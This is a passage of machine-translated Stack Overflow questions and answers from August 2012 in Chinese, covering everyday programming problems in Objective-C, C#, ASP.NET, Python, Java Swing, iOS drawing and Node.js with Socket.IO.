        my @recs = grep /^$car\_/i, @details or next;
        open my $fh, '>', "file_$car.txt" or die $!;
        print $fh @recs;
    }
} 
```

所有打开的文件都会在其句柄超出范围时自动关闭。

希望这可以帮助！

# objective-c - NSArrayController 在 NSTableView 中导致双重提交

> ID：11927906
> 
> 赞同：0
> 
> 时间：2012-08-13T03:37:06.173
> 
> 标签：objective-c, cocoa, cocoa-bindings, nsarraycontroller

我有一个使用 TableViewDataSource 的代码的工作版本，但我想将其转换为使用 NSArrayController。该代码用于我正在为一个项目开发的交互跟踪器。它有点乱，所以我知道它需要一些清理。我在技术上有 2 个问题。

1.  我必须填充实例，然后手动将我的交互类的实例添加到交互数组中。在我尝试遵循的编码示例中，他们使用绑定来执行此操作，而无需调用 [MutableArray addObject:thing]。我宁愿删除填充实例按钮并提交。我有相当数量的绑定为我工作，但我错过了一些东西。

2.  在我填充实例并提交交互后，Tableview 中出现了 2 个条目。一个是空白的，只填写了交互编号。第二个是我在实例中填充的所有信息。双张贴每次都重复。

![截屏](../Images/abc964991a2d2a97c681c3e4d8dfa8eb.png)

我的问题： 1\. 我可以修改/覆盖 NSArrayController 上的 add: 操作以实现更自定义的方法吗？2\. 什么可能导致重复发布？

此时代码相当大。如果有人愿意看它并让我知道我在哪里，我将非常感谢您的帮助。我也可以按照您的方式发送代码。编辑：[这是压缩包中的代码](http://db.tt/WTrGKQ14)

# objective-c - Initializer 元素不是编译时常量

> ID：11927918
> 
> 赞同：0
> 
> 时间：2012-08-13T03:39:14.790
> 
> 标签：objective-c

据我了解，很少有用户询问标题行中列出的错误。但是，我是 Objective-C 编程的新手，我无法连接其他页面上的响应如何回答为什么我在这个程序中遇到错误。

谢谢！

```
@interface ClassA:NSObject

{
    int x;
}

-(void)initVar:(int) a;

@end

@implementation ClassA

-(void)initVar:(int) a
{
    x=a;
}

@end

@interface ClassB:ClassA

-(void)printVar;

@end

@implementation ClassB

-(void)printVar
{
    NSLog(@"X = %i", x);
}

ClassA *a= [[ClassA alloc] init]; // shows error: Initializer element is not a compile-
                                  // time constant.
[a initVar:100]; 

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:13:07.197

Objective-C 是 C 的严格超集。在 C 中，在函数（或 Objective-C 中的方法）之外拥有任何可执行代码是非法的。

如果您的意图是拥有一个全局变量 type `ClassA`，最好的解决方案（恕我直言）是使用类方法来访问它。这也将允许您进行初始化。

```
static ClassA *a = nil; // static limits the visibility of a

+ (ClassA*) theA
{
    static dispatch_once_t pred;

    dispatch_once(&pred, 
    ^{
         a = [[ClassA alloc] init];
         [a initVar:100]; 
    });
} 
```

该`dispatch_once()`调用是当前最受欢迎的习惯用法，以确保初始化代码只执行一次，并且全部以线程安全的方式完成。

您应该为您的`initVar:`方法选择一个不同的名称。`init`前缀是表示对象初始化方法的约定（如）`init`。

# c# - Visual C# 错误：System.Windows.Forms.Button 不包含 ToInt32 的定义

> ID：11927923
> 
> 赞同：0
> 
> 时间：2012-08-13T03:39:40.510
> 
> 标签：c#

我正在研究一个`decimal`在`binary converter`控制台上完美运行的方法，然后我得到了关于我的核心数学运算的这些错误：

`System.Windows.Forms.Button`不包含定义，也找不到接受第一个类型参数的`ToInt32`扩展方法（您是否缺少 using 指令或程序集引用？） Line:93`ToInt32``System.Windows.Forms.Button`

方法“ToString”没有重载需要 2 个参数 Line:94

System.Windows.Forms.Button 不包含“ToInt32”的定义，并且找不到接受“System.Windows.Forms.Button”类型的第一个参数的扩展方法“ToInt32”（您是否缺少 using 指令或装配参考？）行：103

这是代码：

```
 public void Convert_Click(object sender, EventArgs e)
    {
        string Input;
        bool IsNotBinary;
        string Answer;
        Start:
        Input = UserInput.Text;
        int InputLength = Input.Length;
        if (InputLength > 10)
        {
            UserInput.Text = "Overflow";
            goto Start;
        }
        int Int;
        bool IsANumber = int.TryParse(Input, out Int);
        if (IsANumber == false)
        {
            UserInput.Text = "Invalid Character";
            goto Start;
        }
        IsNotBinary = Input.Contains("3");
        if (IsNotBinary == true)
        {
            goto End;

        }
        IsNotBinary = Input.Contains("4");
        if (IsNotBinary == true)
        {
            goto End;

        }
        IsNotBinary = Input.Contains("5");
        if (IsNotBinary == true)
        {
            goto End;

        }
        IsNotBinary = Input.Contains("6");
        if (IsNotBinary == true)
        {
            goto End;

        }
        IsNotBinary = Input.Contains("7");
        if (IsNotBinary == true)
        {
            goto End;

        }
        IsNotBinary = Input.Contains("8");
        if (IsNotBinary == true)
        {
            goto End;

        }
        IsNotBinary = Input.Contains("9");
    End:

        if (IsNotBinary == true)
        {

            // decimal to binary
            int InputInt = Convert.ToInt32(Input); // converts the string "Input" to the int "InputInt"
            Answer = Convert.ToString(InputInt, 2);
            UserInput.Text = Answer;

        }

        else
        {

            // binary to decimal
            Answer = Convert.ToInt32(Input, 2).ToString();
            UserInput.Text = Answer;

        }
        Console.ReadLine();
        goto Start;
    }

    public void QuitButton_Click(object sender, EventArgs e)
    {
        Application.Exit();
    }        
} 
```

}

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T03:44:21.357

错误信息很清楚：

> System.Windows.Forms.Button' 不包含 'ToInt32' 的定义

我的通灵调试器告诉我，您有一个名为 的类级别按钮变量`Convert`，因此您没有`ToInt32`在静态`Convert`类上调用该方法，因为您的按钮隐藏了它。重命名按钮或完全限定名称，即`System.Convert.ToInt32()`.

编辑：

好吧，我想我毕竟不需要我的心理调试器。您的事件处理程序告诉我所有我需要知道的：

```
public void Convert_Click(...) 
```

# c# - 加载 ABCPDF 组件时 ASP.NET 网页损坏（此处附有转储文件）

> ID：11927928
> 
> 赞同：0
> 
> 时间：2012-08-13T03:40:17.003
> 
> 标签：c#, asp.net, .net, pdf, abcpdf

我正在使用 ABCPDF 将 HTML 转换为 PDF。版本为 7.0.4.2。使用相同的代码，它在我的开发服务器（Windows 7）和生产服务器（Windows Server 2008 R2 Standard）中运行良好。但是，当我将 ASP.NET 应用程序部署到一个平淡无奇的新服务器（与工作生产服务器相同的 Window 版本）时。加载 ABCPDF 组件时页面损坏。我设法得到了转储文件。在转储目录中创建了两个文件夹。一个名为 default 的文件夹。ABCPDF 已正确绑定在那里；另一个名为 NativeImage 的文件夹。找不到组件图像。这是转储文件。任何人都可以看到这里出了什么问题。谢谢，

1.  在默认文件夹中转储文件 -

    ***组装活页夹日志条目（8/12/2012 @ 10:52:45 PM）***

    手术成功。绑定结果：hr = 0x0。操作成功完成。

    从以下位置加载的程序集管理器：C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorwks.dll 在可执行文件 C:\Windows\SysWOW64\inetsrv\w3wp.exe 下运行 --- 详细的错误日志如下。

    === 预绑定状态信息 === LOG: User = Unknown LOG: DisplayName = ABCpdf, Version=7.0.4.2, Culture=neutral, PublicKeyToken=a7a0b3f5184f2169 (完全指定) LOG: Appbase = file:///E :/WebIS_80/ LOG: Initial PrivatePath = E:\WebIS_80\bin LOG: Dynamic Base = C:\Windows\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files\root\266bb899 LOG: Cache Base = C :\Windows\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files\root\266bb899 日志：AppName = 7a8839af

    # 调用程序集：ISEP.Web，Version=1.0.0.0，Culture=neutral，PublicKeyToken=null。

    LOG：此绑定在默认加载上下文中开始。LOG：使用应用程序配置文件：E:\WebIS_80\web.config LOG：使用主机配置文件：C:\Windows\Microsoft.NET\Framework\v2.0.50727\Aspnet.config LOG：使用来自 C:\ 的机器配置文件Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config。日志：政策后参考：ABCpdf，版本=7.0.4.2，文化=中性，PublicKeyToken=a7a0b3f5184f2169 日志：通过查看 GAC 找到程序集。LOG：绑定成功。从 C:\Windows\assembly\GAC_MSIL\ABCpdf\7.0.4.2__a7a0b3f5184f2169\ABCpdf.dll 返回程序集。LOG：程序集在默认加载上下文中加载。

2.  在 NativeImage 文件夹中转储文件 -

***组装活页夹日志条目（8/12/2012 @ 10:52:50 PM）***

操作失败。绑定结果：hr = 0x80070002。该系统找不到指定的文件。

从以下位置加载的程序集管理器：C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorwks.dll 在可执行文件 C:\Windows\SysWOW64\inetsrv\w3wp.exe 下运行 --- 详细的错误日志如下。

=== 预绑定状态信息 === LOG: User = Unknown LOG: DisplayName = ABCpdf, Version=7.0.4.2, Culture=neutral, PublicKeyToken=a7a0b3f5184f2169 (完全指定) LOG: Appbase = file:///E :/WebIS_80/ LOG: Initial PrivatePath = E:\WebIS_80\bin LOG: Dynamic Base = C:\Windows\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files\root\266bb899 LOG: Cache Base = C :\Windows\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files\root\266bb899 日志：AppName = 7a8839af

# 调用程序集：ISEP.Web，Version=1.0.0.0，Culture=neutral，PublicKeyToken=null。

LOG：开始绑定原生图片ABCpdf，Version=7.0.4.2，Culture=neutral，PublicKeyToken=a7a0b3f5184f2169。警告：未找到匹配的本机图像。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:49:59.977

ABCPDF 是否有需要安装的非托管库？确保您已在新服务器上运行 ABCPDF 的安装程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T00:30:21.120

他们的版本 7 不适用于 IE9。内部 IE 组件是从它们的 DLL 调用的。在服务器中降级到IE8后，它现在可以工作了

# python - 将 kwargs 传递给动态实例化的 Python 类

> ID：11927936
> 
> 赞同：0
> 
> 时间：2012-08-13T03:41:18.290
> 
> 标签：python, class, eval

也许（通常是）一种更好的方法来做我正在尝试的事情，但我目前正在制作一个这样的对象列表：

```
my_list = [MyObject(d**) for d in db.myobjects.find({...})] 
```

这很有效，因为它创建了将我的数据库查询返回的字典对象转换为“MyObjects”，并添加了一堆类方法和属性。

当类名在运行时动态插入时，我该如何做同样的事情？我可以使用动态创建类，`eval()`但如何插入字典对象？

```
my_list = [eval('FooObject') for d in db.fooobjects.find({...})]  # needs kwargs from dicts 
```

任何帮助都是极好的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:45:44.377

首先，考虑使用`globals()`而不是`eval()`，特别是如果类字符串来自用户输入。

对于您的实际问题，它的工作方式完全相同 -`eval('FooClass')`或者`globals()['FooClass']`为您提供*类本身*，它不会实例化它。这意味着您可以通过调用它来实例化它，就像您提前知道它的名称一样：

```
globals()['FooClass'](**d) 
```

# iphone - iOS：核心文本 - 在块内绘制图像时丢失上下文

> ID：11927942
> 
> 赞同：0
> 
> 时间：2012-08-13T03:42:27.147
> 
> 标签：iphone, ios, drawing, cgcontext, core-text

我目前正在编辑 FTCoreText 模块以直接从网络加载图像并使用 Core Text 显示它们。
因此，我对[https://github.com/FuerteInternational/FTCoreText/blob/master/FTCoreText/classes/FTCoreTextView.m#L1149](https://github.com/FuerteInternational/FTCoreText/blob/master/FTCoreText/classes/FTCoreTextView.m#L1149)进行了一些编辑，以使用 AFNetworking 的 UIImageView 类别。现在，我使用一个块从互联网下载图像并将其绘制到视图中。图像已绘制，但上下文有误：

```
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextSaveGState: invalid context 0x0
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextSaveGState: invalid context 0x0
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextSetBlendMode: invalid context 0x0
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextSetAlpha: invalid context 0x0
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextTranslateCTM: invalid context 0x0
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextScaleCTM: invalid context 0x0
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextDrawImage: invalid context 0x0
Aug 13 05:34:50 Yohann-iPhone CCFA[9878] <Error>: CGContextRestoreGState: invalid context 0x0 
```

你可以在这里看到我的块：

```
UIImageView *imgNode = [[UIImageView alloc] init];
NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:imageNode.imageName]];
[imgNode setImageWithURLRequest:request placeholderImage:[UIImage imageNamed:@"rien.gif"] success:^(NSURLRequest *request, NSHTTPURLResponse *response, UIImage *image) {
                if (alignment == kCTRightTextAlignment) x = (self.frame.size.width - image.size.width);
                if (alignment == kCTCenterTextAlignment) x = ((self.frame.size.width - image.size.width) / 2);

                frame = CGRectMake(x, (lineFrame.origin.y - image.size.height), image.size.width, image.size.height);

                if (alignment != kCTCenterTextAlignment) frame.origin.x = (alignment == kCTLeftTextAlignment)? insets.left : (self.frame.size.width - image.size.width - insets.right);
                frame.origin.y += insets.top;
                frame.size.width = ((insets.left + insets.right + image.size.width ) > self.frame.size.width)? self.frame.size.width : image.size.width;

                frame = CGRectMake((((320-2*20)-image.size.width)/2), frame.origin.y, image.size.width, image.size.height);
                NSLog(@"Frame : %f %f", frame.size.width, frame.size.height);
                NSLog(@"Image : %f %f", image.size.width, image.size.height);
                CGContextRef context = UIGraphicsGetCurrentContext();                       
                CGContextSaveGState(context);

                [image drawInRect:CGRectIntegral(frame)];
            } failure:nil];
            [imgNode.image drawInRect:CGRectIntegral(frame)]; 
```

当然，我将整个代码粘贴到你这里：http: [//pastebin.com/Qj6PtEFj](http://pastebin.com/Qj6PtEFj)

我希望你能帮帮我 ：） ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-26T22:45:03.823

我有类似的问题，并用`UIGraphicsPushContext(context)/UIGraphicsPushContext(context)`绘图代码解决了它。上下文是用

```
CGColorSpaceRef space = CGColorSpaceCreateDeviceRGB();
CGContextRef context = CGBitmapContextCreate(NULL, width, height, 8, 0, space, kCGImageAlphaPremultipliedLast); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-24T01:59:04.873

只是建议，如果您遇到错误，例如

> “CGContextSaveGState：无效的上下文 0x0”</p>

意味着您没有在正确的上下文中工作，这`UIGraphicsGetCurrentContext()`是不正确的。获取绘制发生的原始上下文并将其传递给完整的块。

# visual-studio-2010 - Visual Studio 2010 的哪些版本具有 SharePoint 2010 项目/项模板？

> ID：11927944
> 
> 赞同：-2
> 
> 时间：2012-08-13T03:42:31.997
> 
> 标签：visual-studio-2010, sharepoint-2010

我想知道 Visual Studio 2010 的哪些版本有 SharePoint 2010 项目模板？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:52:31.877

从[MSDN](http://msdn.microsoft.com/en-us/library/ee231592)：

> 要构建 SharePoint 解决方案，开发计算机必须安装正确版本的 SharePoint 服务器。否则，构建 SharePoint 解决方案与在 Visual Studio 中构建其他类型的项目相同。有关详细信息，请参阅如何：构建 SharePoint 解决方案。

所以我希望这意味着可以使用除 Express 之外的任何版本的 Visual Studio，但要获得安装 Sharepoint 时需要安装开发支持/工具的模板。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T04:11:04.023

首先，我确定这个问题是重复的。

无论如何，答案是“除了快递”。请参阅[Visual Studio 2010 比较](http://www.microsoft.com/visualstudio/en-us/products/2010-editions/product-comparison)。

# objective-c - 如何更改分组的表格视图单元格的背景？

> ID：11927946
> 
> 赞同：0
> 
> 时间：2012-08-13T03:43:30.040
> 
> 标签：objective-c, ios, uitableview

我想更改分组表视图单元格的背景。假设您有 5 个分组单元格。顶部单元格的左上角和右上角是圆角，底部单元格的左下角和右下角是圆角，中间单元格没有圆角。这就是问题所在。如果我设置每个单元格的背景，顶部和底部单元格看起来就像中间的单元格，没有顶部和底部角。如何设置背景以使顶部和底部单元格四舍五入，而不会最终使每个单元格看起来相同。提前致谢。

编辑：还有另一个旁注。在某些情况下，tableview 单元格只显示一个单元格，这意味着每个角都是圆角的。那么如何设置可以处理所有这些情况的背景。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T06:44:28.063

你有没有尝试过

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

 static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

if (cell == nil) {
    cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle 
                                  reuseIdentifier:CellIdentifier];

    if (indexPath.row == 0) 
    { 
        NSLog(@"Here my first cell");
        cell.contentView.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"myFirstCellPicture.png"]];
     } else {
        NSLog(@"myOtherCells");
        cell.contentView.backgroundColor  = [UIColor colorWithPatternImage:[UIImage imageNamed:@"otherCellPicture.PNG"]];

    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T06:50:52.520

您可以为单元格设置背景渐变，在这种情况下您可能不必担心圆角，因为您使用了 cell.layer。（对于您项目中的此导入 Quartz 框架）

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath 
   {

       static NSString *CellIdentifier = @"Cell";
       UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

     if (cell == nil) 
     {
          cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];

            if (indexPath.row == 0)  // first cell
            {
         // set background gradient
         CAGradientLayer *gradient =  [[CAGradientLayer alloc] init];
         gradient.position = CGPointMake(0, 0);
         gradient.frame = cell.frame; 
         gradient.colors = [NSArray arrayWithObjects:(id)[[UIColor colorWithRed:0.207 green:0.207 blue:0.207 alpha:1.0] CGColor], (id)[[UIColor colorWithRed:0.125 green:0.125 blue:0.125 alpha:1.0] CGColor], nil];
             [[cell.layer.sublayers objectAtIndex:0] removeFromSuperlayer];
         [cell.layer insertSublayer:gradient atIndex:0];
         [gradient release];
            }
            else if (indexPath.row == 1) // second cell
            {
            //
            // Another gradient
            //
            }
      }
      return cell;
   } 
```

# java - JVM pmap 中的前四个“匿名”部分是什么？

> ID：11927949
> 
> 赞同：3
> 
> 时间：2012-08-13T03:43:50.327
> 
> 标签：java, memory-management, jvm

我知道有很多不同的地方分配了 JVM 堆外内存：线程堆栈、内存映射文件（例如 zip 文件）、NIO 缓冲区、JNI 库分配等。

但我希望前四个分配有一个规范的标识，例如：

```
/apps/java/jdk1.7.0_05/bin/java -Xmx1024m -Xms1024m -XX:MaxPermSize=256m ...
0000000000400000      4K r-x--  /apps/java/jdk1.7.0_05/bin/java
0000000000600000      4K rw---  /apps/java/jdk1.7.0_05/bin/java
0000000001e69000 280920K rw---    [ anon ]
00000000b0000000 132288K rw---    [ anon ]
00000000b8130000 129856K rw---    [ anon ]
00000000c0000000 1048576K rw---    [ anon ]
00000030b4e00000    120K r-x--  /lib64/ld-2.12.so
... 
```

我认为最后一个很可能是堆，基于它的大小，但有人知道其他三个是什么吗？能够识别尽可能多`anon`的部分以用于诊断目的将很有帮助。

# python - 如何让这个程序运行得更快？

> ID：11927950
> 
> 赞同：-1
> 
> 时间：2012-08-13T03:44:02.980
> 
> 标签：python, algorithm

所以这是我用 Python 编写的第一批程序之一。我正在尝试获取一个字符串，并输出所有真实单词的字符串。我已经完成了（我需要找到一个包含更多单词的参考文件）但是它不可扩展，因为我不能输入超过 8 个字符，而 Python 需要很长时间才能返回一些东西。

```
def lower_and_remove_spaces(fill_string):
    '''
    function takes a string of 2 or more characters and prints out all the permutations
    of words that the characters can make. 
    '''
    lower_string = ''

    for i in fill_string:
        if i.isalpha():
            lower_string += i.lower()

    return lower_string    

def fill_list(input_string):
   iter_list = []
   string_list = []
   this_string = lower_and_remove_spaces(input_string)
   for num in range(2,len(this_string)+1):
      iter_list.append(itertools.permutations(this_string,num))

   for iters in iter_list:
      for lists in iters:
         string_list.append(list(lists))

    return string_list

def word_list(string):
   string_list = fill_list(string)
   a_word_list = []
   a_string = ''
   for i in string_list:
      if not a_string == '':
         a_word_list.append(a_string)
      a_string = ''
      for y in i:
         a_string += y
    return a_word_list 
```

我知道这会跳很多，但我想知道有什么更好的方法来做到这一点，以便它具有可扩展性？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T03:52:36.293

一些快速的想法：使所有排列都变成 O(n!)，没有办法解决这个问题。即使您优化了代码，当 n 接近更大的数字时，您仍然会碰壁。如果你有一本有效词的字典，这个问题就有点不同了。在病态输入集（您的字典包含所有排列）下，您没有比这更好的了。

但是，您可以执行以下操作

1.  将有效单词字典保存在前缀树中
2.  手动递归生成排列，而不是通过 itertools.ie，选择一个字母，开始一个单词，递归
3.  在每一步，检查前缀是否有效，否则修剪搜索树。

这在实践中的性能将比 O(n!)

如果你不熟悉前缀树，这里有一种方法可以用 Python 哈希来模拟相同的东西

```
 def prefix_hash(list_o_words):
       ret = {}
       for word in list_o_words:
           for i in range(2,len(word)-1):
               ret[word[:i]] = 'prefix'  # this should check if it's a word first..
       ret[word] = 'word' 
```

如果您需要更多帮助，请提出问题。

# java - 使用 Swing 动态重新排列布局

> ID：11927952
> 
> 赞同：4
> 
> 时间：2012-08-13T03:44:27.310
> 
> 标签：java, swing, layout, miglayout

我正在使用 Swing 构建一个与 Twitter 功能相似的桌面应用程序。我有一个显示“推文”的“提要”页面。

我在 JPanel 中有“推文”，并希望通过在 JPanel 顶部放置新的“推文”并将旧的推文向下移动来动态显示新的推文。我试图通过使用 MigLayout 来做到这一点， `jpanel.add(tweet, "cell 0 0, wrap")`但这并没有按预期工作，为了让它以我想要的布局显示，我必须调用`jpanel.revalidate()`.

这并不理想，因为每秒可能会有很多推文，并且重新绘制面板可能会很慢。无论如何我可以在面板顶部添加新的“推文”而不重绘？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T03:59:21.560

简短的回答，不。说真的，花点时间思考这个问题。“我要加新内容，但不更新画面”，你觉得可行吗？

你最终将不得不进行某种绘画。问题是多久一次。

然而...

通过一些简单的技术（和建模），您可以将更新“合并”成批次，从而使重绘更有意义（而不是绘制每条新推文，您绘制一个批次）。

您可以使用[SwingWorker](http://docs.oracle.com/javase/7/docs/api/javax/swing/SwingWorker.html)之类的东西来执行此操作。基本上`publish`是推文并允许该`process`方法处理之后添加块。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-13T04:35:29.500

虽然动态布局是可能的，如此处和[此处所示](https://stackoverflow.com/a/5751044/230513)[，](https://stackoverflow.com/a/3078354/230513)但我会使用单列[`JTable`](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html)和 a`TableModel`来反映您想要的*下推堆栈*效果，也许一列具有内部`Queue<Tweet>`. `JTable`渲染效率很高，并且组件在`JScrollPane`.

# iphone - 谷歌日历在 iPhone 上的实现？

> ID：11927955
> 
> 赞同：1
> 
> 时间：2012-08-13T03:44:54.500
> 
> 标签：iphone, ios, ipad, google-calendar-api

我想使用 GData 在 iPhone 上实现 Google 日历网格视图链接。所以我成功实现并通过 GData 访问了我的 Google 帐户。但我可以看到 TableView 结构中的所有事件......我想要如下屏幕截图中的结构。

![在此处输入图像描述](../Images/b17c83916d79544457e9ed3cfd1c5a2e.png)

我怎样才能得到这个观点？

[我从此链接](http://code.google.com/p/gdata-objectivec-client/)下载了演示应用程序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T07:30:06.613

嗨，是否有一个第三方 API 可以像这样显示日历..

我在这里展示一些代码

实施周，

```
- (MAEvent *)event {
static int counter;

NSMutableDictionary *dict = [[NSMutableDictionary alloc] init];

[dict setObject:[NSString stringWithFormat:@"number %i", counter++] forKey:@"test"];

MAEvent *event = [[MAEvent alloc] init];
event.backgroundColor = [UIColor purpleColor];
event.textColor = [UIColor whiteColor];
event.allDay = NO;
event.userInfo = dict;
return event;
}

- (void)weekView:(MAWeekView *)weekView eventTapped:(MAEvent *)event {
NSDateComponents *components = [CURRENT_CALENDAR components:DATE_COMPONENTS fromDate:event.start];
NSString *eventInfo = [NSString stringWithFormat:@"Hour %i. Userinfo: %@", [components hour], [event.userInfo objectForKey:@"test"]];

UIAlertView *alert = [[UIAlertView alloc] initWithTitle:event.title
                                                 message:eventInfo delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
[alert show];
} 
```

Day.. tatic NSDate *date = nil 的实现；

```
- (NSArray *)dayView:(MADayView *)dayView eventsForDate:(NSDate *)startDate 
{
date = startDate;

NSArray *arr = [NSArray arrayWithObjects: self.event, self.event, self.event,
                self.event, self.event, self.event, self.event,  self.event, self.event, nil];
static size_t generateAllDayEvents;

generateAllDayEvents++;

if (generateAllDayEvents % 4 == 0)
{
    ((MAEvent *) [arr objectAtIndex:0]).title = @"All-day events test";
    ((MAEvent *) [arr objectAtIndex:0]).allDay = YES;
    ((MAEvent *) [arr objectAtIndex:1]).title = @"All-day events test";
    ((MAEvent *) [arr objectAtIndex:1]).allDay = YES;
}
return arr;
}

 - (MAEvent *)event {
static int counter;
static BOOL flag;

NSMutableDictionary *dict = [[NSMutableDictionary alloc] init];

[dict setObject:[NSString stringWithFormat:@"number %i", counter++] forKey:@"test"];

unsigned int r = arc4random() % 24;
int rr = arc4random() % 3;

MAEvent *event = [[MAEvent alloc] init];
event.backgroundColor = ((flag = !flag) ? [UIColor purpleColor] : [UIColor brownColor]);
event.textColor = [UIColor whiteColor];
event.allDay = NO;
event.userInfo = dict;

if (rr == 0) {
    event.title = @"Event lorem ipsum es dolor test. This a long text, which should clip the event view bounds.";
} else if (rr == 1) {
    event.title = @"Foobar.";
} else {
    event.title = @"Dolor test.";
}

NSDateComponents *components = [CURRENT_CALENDAR components:DATE_COMPONENTS fromDate:date];
[components setHour:r];
[components setMinute:0];
[components setSecond:0];

event.start = [CURRENT_CALENDAR dateFromComponents:components];

[components setHour:r+rr];
[components setMinute:0];

event.end = [CURRENT_CALENDAR dateFromComponents:components];

return event;
 } 
```

# node.js - Socket.IO Simple Express 示例不适用于 OS X Mountain Lion

> ID：11927958
> 
> 赞同：0
> 
> 时间：2012-08-13T03:44:57.790
> 
> 标签：node.js, express, socket.io

我正在使用[https://github.com/LearnBoost/socket.io](https://github.com/LearnBoost/socket.io)中的以下示例代码来启动 Socket.IO 和 Express 示例。

当我到达本地主机时，我收到此错误：

```
Cannot GET / 
```

我的 app.js 看起来像这样：

```
var express = require('express');
var io = require('socket.io');
var server = require('http');

var app = express()
  , server = require('http').createServer(app)
  , io = io.listen(server);

server.listen(80);

io.sockets.on('connection', function (socket) {
  socket.emit('news', { hello: 'world' });
  socket.on('my other event', function (data) {
    console.log(data);
  });
}); 
```

我的 index.html 看起来像这样：

```
<script src="/socket.io/socket.io.js"></script>
<script>
  var socket = io.connect('http://localhost');
  socket.on('news', function (data) {
     console.log(data);
     socket.emit('my other event', { my: 'data' });
  });
</script> 
```

套餐：

```
npm ls
├─┬ express@3.0.0rc2
│ ├── commander@0.6.1
│ ├─┬ connect@2.4.2
│ │ ├── bytes@0.1.0
│ │ ├── formidable@1.0.11
│ │ ├── pause@0.0.1
│ │ └── qs@0.4.2
│ ├── cookie@0.0.4
│ ├── crc@0.2.0
│ ├── debug@0.7.0
│ ├── fresh@0.1.0
│ ├── methods@0.0.1
│ ├── mkdirp@0.3.3
│ ├── range-parser@0.0.4
│ └─┬ send@0.0.3
│   └── mime@1.2.6
└─┬ socket.io@0.9.10
  ├── policyfile@0.0.4
  ├─┬ redis@0.7.2
  │ └── hiredis@0.1.14
  └─┬ socket.io-client@0.9.10
    ├─┬ active-x-obfuscator@0.0.1
    │ └── zeparser@0.0.5
    ├── uglify-js@1.2.5
    ├─┬ ws@0.4.21
    │ ├── commander@0.6.1
    │ ├── options@0.0.3
    │ └── tinycolor@0.0.1
    └── xmlhttprequest@1.4.2 
```

谢谢！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T04:38:23.850

您没有指示 Express 提供您的`index.html`文件。让它运行的最简单的方法可能是创建一个名为`public`并放入其中的目录`index.html`，然后修改您的 Express 服务器，以便它提供来自该目录的静态文件：

```
var express = require('express');
var io = require('socket.io');
var server = require('http');
var path = require('path');

var app = express()
  , server = require('http').createServer(app)
  , io = io.listen(server);
app.use(express.static(path.join(__dirname, 'public'))); 
```

然后`localhost/index.html`在浏览器中访问。

# iphone - 测试账号恢复MKStoreKit中未购买的产品

> ID：11927961
> 
> 赞同：1
> 
> 时间：2012-08-13T03:45:23.053
> 
> 标签：iphone, ios, ipad, mkstorekit

我在最新的 MKStoreKit 中创建了一个新的测试帐户来测试恢复选项，我没有使用新的测试帐户或任何其他测试帐户购买此项目“非消耗品”。它仍然给了我一个恢复成功的答案并执行了 onComplete 代码块。我的问题：测试账号恢复未购买的产品是正常行为吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T22:01:30.270

不，这不是正常行为，请注意restore方法中的onComplete代码块将在帐户是否购买过该产品时执行，onComplete这里表示用户已成功登录，请求已发送到苹果和它收到了回复。最好在检查未完成后提供内容，有关更多详细信息，请参阅此答案：[Restoreing an in app purchase with a user who never paid for it](https://stackoverflow.com/questions/11086179/restoring-an-in-app-purchase-with-a-user-who-never-paid-for-it/11241869#11241869)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-31T10:13:59.227

MKStoreKit 在恢复购买的物品功能上有一个很大的漏洞。
有关更多详细信息，请访问[此处](https://github.com/MugunthKumar/MKStoreKit/pull/146)。

# java - 从 JFrame 获取输入

> ID：11927963
> 
> 赞同：2
> 
> 时间：2012-08-13T03:45:35.877
> 
> 标签：java, swing, class

我对如何编程有点困惑。我有一个用两个文本字段扩展 JFrame 的类。我希望能够从 JFrame 获取输入。不知何故，只是等待我的 mainMaybe 类的输入......有什么想法吗？

```
import java.awt.BorderLayout;
